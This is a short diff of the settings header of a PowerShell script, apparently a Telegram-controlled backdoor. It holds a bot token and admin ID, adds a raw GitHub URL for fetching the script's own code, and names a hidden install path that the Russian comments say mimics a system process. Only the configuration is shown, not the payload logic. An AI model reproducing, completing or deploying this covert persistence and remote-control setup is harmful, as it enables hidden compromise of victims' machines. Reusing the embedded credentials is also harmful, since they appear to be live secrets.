@@ -1,7 +1,7 @@
 # --- НАСТРОЙКИ ---
 $token = "8220355086:AAFI1_k4FoKIF18FShkBn0yezO5dDldzs88"
 $admin_id = "6494641721"
-$url_raw = "ССЫЛКА_НА_ЭТОТ_ЖЕ_ПАСТЕБИН_RAW" # Сюда вставь прямую ссылку на этот код
+$url_raw = "https://raw.githubusercontent.com/tidomail13719-art/safe-test-/628e77a85101f3ef4e7bc6ef28fd5e1634e1d313/test" # Сюда вставь прямую ссылку на этот код
 
 # Путь для скрытой установки (косим под системный процесс)
 $install_path = "$env:APPDATA\Microsoft\Windows\Templates\win_services.ps1"
